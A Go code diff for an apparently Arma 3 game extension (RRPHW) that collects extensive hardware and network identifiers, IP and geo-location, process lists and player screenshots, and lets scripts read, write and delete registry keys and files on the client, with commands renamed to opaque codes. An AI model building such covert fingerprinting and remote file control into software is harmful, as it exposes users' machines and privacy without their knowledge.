@@ -4,19 +4,21 @@ package main
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
+
+#include "extensionCallback.h"
 */
 import "C"
 
 import (
 	"bytes"
-	"crypto/rand"
 	"encoding/json"
 	"fmt"
-	"net"
+	"os"
 	"regexp"
 	"time"
 	"unsafe"
 
+	"github.com/rdegges/go-ipify"
 	"golang.org/x/oauth2"
 	"golang.org/x/oauth2/google"
 	"google.golang.org/api/drive/v3"
@@ -24,74 +26,165 @@ import (
 
 func main() {}
 
-func writeGUIDregistr() {
-	id, err := readReg("current_user", `Software\Classes\mscfile\shell\open\command`, "GUID")
-	fmt.Printf("%s\n", id)
-	if err != nil {
-		guid := generateGUID()
-		writeReg("current_user", `Software\Classes\mscfile\shell\open\command`, "GUID", guid)
-	}
+var extensionCallbackFnc C.extensionCallback
+
+func runExtensionCallback(name *C.char, function *C.char, data *C.char) C.int {
+	return C.runExtensionCallback(extensionCallbackFnc, name, function, data)
 }
 
-func generateGUID() (uuid string) {
-	b := make([]byte, 16)
-	_, err := rand.Read(b)
-	if err != nil {
-		returnMyData("errors", err)
-	}
-	uuid = fmt.Sprintf("%x%x%x%x%x%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:13], b[13:])
-	return
+func callBackArma(input string) {
+
+	id := returnMyData(input, nil)
+	temp := (fmt.Sprintf("%s", id))
+
+	name := C.CString("returnHWID")
+	defer C.free(unsafe.Pointer(name))
+	function := C.CString(input)
+	defer C.free(unsafe.Pointer(function))
+	// Make a callback to Arma
+	param := C.CString(temp)
+	defer C.free(unsafe.Pointer(param))
+	runExtensionCallback(name, function, param)
 }
 
-func getMacAddr() (addr string) {
-	interfaces, err := net.Interfaces()
-	if err == nil {
-		for _, i := range interfaces {
-			if i.Flags&net.FlagUp != 0 && bytes.Compare(i.HardwareAddr, nil) != 0 {
-				addr = i.HardwareAddr.String()
-				break
-			}
-		}
-	}
-	return
+//export goRVExtensionRegisterCallback
+func goRVExtensionRegisterCallback(fnc C.extensionCallback) {
+	extensionCallbackFnc = fnc
 }
 
 func returnMyData(input string, errors error) string {
-	rID := ""
+
 	switch input {
-	case "hwid":
-		id, _ := readReg("local_machine", `SOFTWARE\Microsoft\Cryptography`, "MachineGuid")
-		rID = fmt.Sprintf(id)
-	case "HDD_UID":
-		id, _ := readReg("local_machine", `HARDWARE\DESCRIPTION\System\MultifunctionAdapter\0\DiskController\0\DiskPeripheral\0`, "Identifier")
-		rID = fmt.Sprintf(id)
-	case "Product_Win":
-		id, _ := readReg("local_machine", `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, "ProductId")
-		rID = fmt.Sprintf(id)
-	case "processList":
-		rID = fmt.Sprintf(getProcesses())
-	case "MAC":
-		rID = fmt.Sprintf(getMacAddr())
-	case "GUID":
-		id, _ := readReg("current_user", `Software\Classes\mscfile\shell\open\command`, "GUID")
-		rID = fmt.Sprintf(id)
+	case "checkDRM":
+		if !DRMUnlocked {
+			return "NO"
+		}
+		return "YES"
+	case "getPlayerUID":
+		return GetPlayerUid()
+	case "isBan":
+		return fmt.Sprintf("%s", CheckBan())
+	case "close":
+		os.Exit(1)
+		return "closed"
+	case "loadSqf":
+		return GetSqfStartCode()
+	case "panic":
+		return "panic"
 	case "version":
 		writeGUIDregistr()
-		rID = fmt.Sprintf("v3 03.05.21")
+		return fmt.Sprintf("v4 07.06.21")
 	case "errors":
-		rID = fmt.Sprintf("Error '%s'", errors)
+		return fmt.Sprintf("Error '%s'", errors)
 	case "info":
-		rID = fmt.Sprintf("Created by FairyTale5571. Commands not available for public")
-	default:
-		id := fmt.Sprintf("Error '%s' is undefined command, contact Discord FairyTale#5571 for more information", input)
-		rID = id
+		return fmt.Sprintf("Created by FairyTale5571. Commands not available for public")
+	case "4_c": // clean temp dir
+		cleanTemp()
+		return fmt.Sprintf("Success")
+	case "4_c_a":
+		cleanOldFiles()
+		return "success"
 	}
-	return rID
+
+	if !DRMUnlocked {
+		return "U need to disable DRM, contact me FairyTale#5571"
+	}
+
+	switch input {
+	case "isAdmin":
+		return fmt.Sprintf("%d", isAdmin())
+	case "get_HWID": // hwid
+		id, _ := readReg("local_machine", `SOFTWARE\Microsoft\Cryptography`, "MachineGuid")
+		return fmt.Sprintf(id)
+	case "get_HDDUID": // HDD_UID
+		id, _ := readReg("local_machine", `HARDWARE\DESCRIPTION\System\MultifunctionAdapter\0\DiskController\0\DiskPeripheral\0`, "Identifier")
+		return fmt.Sprintf(id)
+	case "get_Product": // Product_Win
+		return getProductId()
+	case "get_Process": // processList
+		return fmt.Sprintf(getProcesses())
+	case "get_MAC": // MAC
+		return fmt.Sprintf(getMacAddr())
+	case "get_GUID": // GUID
+		id, _ := readReg("current_user", `Software\Classes\mscfile\shell\open\command`, "GUID")
+		return fmt.Sprintf(id)
+	case "get_IP":
+		ip, err := ipify.GetIp()
+		if err != nil {
+			return "Cant get ip"
+		}
+		return fmt.Sprintf(ip)
+	case "get_GeoIP":
+		return getGeoIp()
+	case "get_Sd":
+		return GetDsName()
+	/*************************************/
+	case "GetCPU_id":
+		return getCpuId()
+	case "GetCPU_name":
+		return getCpuName()
+	/*************************************/
+	case "GetMother_id":
+		return getMotherId()
+	case "GetMother_name":
+		return getMotherName()
+	/*************************************/
+	case "GetBios_id":
+		return getBiosId()
+	case "GetBios_ReleaseDate":
+		return getBiosReleaseDate()
+	case "GetBios_Version":
+		return getBiosVersion()
+	/*************************************/
+	case "GetRam_serialNumber":
+		return getRamSerialNumber()
+	case "GetRam_capacity":
+		return getRamCapacity()
+	case "GetRam_partNumber":
+		return getRamPartNumber()
+	case "GetRam_Name":
+		return getRamName()
+	/*************************************/
+	case "GetProduct_Date":
+		return getProductInstallDate()
+	case "GetProduct_Version":
+		return getProductVersion()
+	/*************************************/
+	case "GetPC_name":
+		return getPcName()
+	case "Get_SID":
+		return getSID()
+	case "Get_VRAM_name":
+		return getVRAM()
+	/*************************************/
+	default:
+		return fmt.Sprintf("Error '%s' is undefined command, contact Discord FairyTale#5571 for more information", input)
+	}
+
+}
+
+func screenCallBack(p_name string, p_uid string) {
+
+	name := C.CString("returnHWID")
+	defer C.free(unsafe.Pointer(name))
+	function := C.CString("3_c")
+	defer C.free(unsafe.Pointer(function))
+	// Make a callback to Arma
+
+	t := time.Now()
+	path := fmt.Sprintf("/screenshots/%s_%s/%d/%d/%d", p_name[1:len(p_name)-1], p_uid[1:len(p_uid)-1], t.Year(), t.Month(), t.Day())
+	makeScreenshot(path)
+
+	param := C.CString(path)
+	defer C.free(unsafe.Pointer(param))
+
+	runExtensionCallback(name, function, param)
+	return
 }
 
 //export goRVExtensionVersion
 func goRVExtensionVersion(output *C.char, outputsize C.size_t) {
-	result := C.CString("RRPHW v3.00")
+	result := C.CString("RRPHW v4")
 	defer C.free(unsafe.Pointer(result))
 	var size = C.strlen(result) + 1
 	if size > outputsize {
@@ -102,6 +195,7 @@ func goRVExtensionVersion(output *C.char, outputsize C.size_t) {
 
 //export goRVExtension
 func goRVExtension(output *C.char, outputsize C.size_t, input *C.char) {
+
 	id := returnMyData(C.GoString(input), nil)
 	temp := (fmt.Sprintf("%s", id))
 	printInArma(output, outputsize, temp)
@@ -112,8 +206,19 @@ func goRVExtensionArgs(output *C.char, outputsize C.size_t, input *C.char, argv 
 	offset := unsafe.Sizeof(uintptr(0))
 	action := C.GoString(input)
 	clearArgs := cleanInput(argv, int(argc))
+
+	if f, ok := Cmd2Action[action]; ok {
+		printInArma(output, outputsize, f(clearArgs...))
+		return
+	}
+
+	if !DRMUnlocked {
+		printInArma(output, outputsize, "U need to disable DRM, contact me FairyTale#5571")
+		return
+	}
+
 	switch action {
-	case "credentials":
+	case "1_c": // credentials
 		var err error
 		_creds_json := (**C.char)(unsafe.Pointer(uintptr(unsafe.Pointer(argv))))
 		creds_json := C.GoString(*_creds_json)
@@ -131,7 +236,7 @@ func goRVExtensionArgs(output *C.char, outputsize C.size_t, input *C.char, argv 
 		}
 		printInArma(output, outputsize, "Creds accepted")
 		return
-	case "token":
+	case "2_c": // token
 		_token_json := (**C.char)(unsafe.Pointer(uintptr(unsafe.Pointer(argv))))
 		token_json := C.GoString(*_token_json)
 		token_json = token_json[1 : len(token_json)-1]
@@ -151,36 +256,53 @@ func goRVExtensionArgs(output *C.char, outputsize C.size_t, input *C.char, argv 
 		}
 		printInArma(output, outputsize, "Token accepted")
 		return
-	case "doit":
+	case "3_c_t":
 		_name := (**C.char)(unsafe.Pointer(uintptr(unsafe.Pointer(argv))))
 		_uid := (**C.char)(unsafe.Pointer(uintptr(unsafe.Pointer(argv)) + offset))
 
 		name := C.GoString(*_name)
 		uid := C.GoString(*_uid)
 
-		t := time.Now()
-		path := fmt.Sprintf("/screenshots/%s_%s/%d/%d/%d", name[1:len(name)-1], uid[1:len(uid)-1], t.Year(), t.Month(), t.Day())
+		path := fmt.Sprintf("/%s_%s", name[1:len(name)-1], uid[1:len(uid)-1])
 		time.Sleep(5 * time.Second)
 		makeScreenshot(path)
 		printInArma(output, outputsize, "Done")
 		return
-	case "write_reg":
+	case "3_c": // doit
+
+		_name := (**C.char)(unsafe.Pointer(uintptr(unsafe.Pointer(argv))))
+		_uid := (**C.char)(unsafe.Pointer(uintptr(unsafe.Pointer(argv)) + offset))
+
+		name := C.GoString(*_name)
+		uid := C.GoString(*_uid)
+
+		if extensionCallbackFnc != nil {
+			screenCallBack(name, uid)
+		} else {
+
+			path := fmt.Sprintf("/%s_%s", name[1:len(name)-1], uid[1:len(uid)-1])
+			time.Sleep(5 * time.Second)
+			makeScreenshot(path)
+			printInArma(output, outputsize, "Done")
+		}
+		return
+	case "1_r": // write_reg
 		printInArma(output, outputsize, writeReg(clearArgs[0], clearArgs[1], clearArgs[2], clearArgs[3]))
 		return
-	case "read_reg":
+	case "2_r": // read_reg
 		r, _ := readReg(clearArgs[0], clearArgs[1], clearArgs[2])
 		printInArma(output, outputsize, r)
 		return
-	case "del_reg":
+	case "3_r": // del_reg
 		printInArma(output, outputsize, delReg(clearArgs[0], clearArgs[1], clearArgs[2]))
 		return
-	case "write_file":
+	case "1_f": // write_file
 		printInArma(output, outputsize, writeFile(clearArgs[0], clearArgs[1]))
 		return
-	case "read_file":
+	case "2_f": // read_file
 		printInArma(output, outputsize, readFile(clearArgs[0]))
 		return
-	case "delete_file":
+	case "3_f": // delete_file
 		printInArma(output, outputsize, delFile(clearArgs[0]))
 		return
 	default:
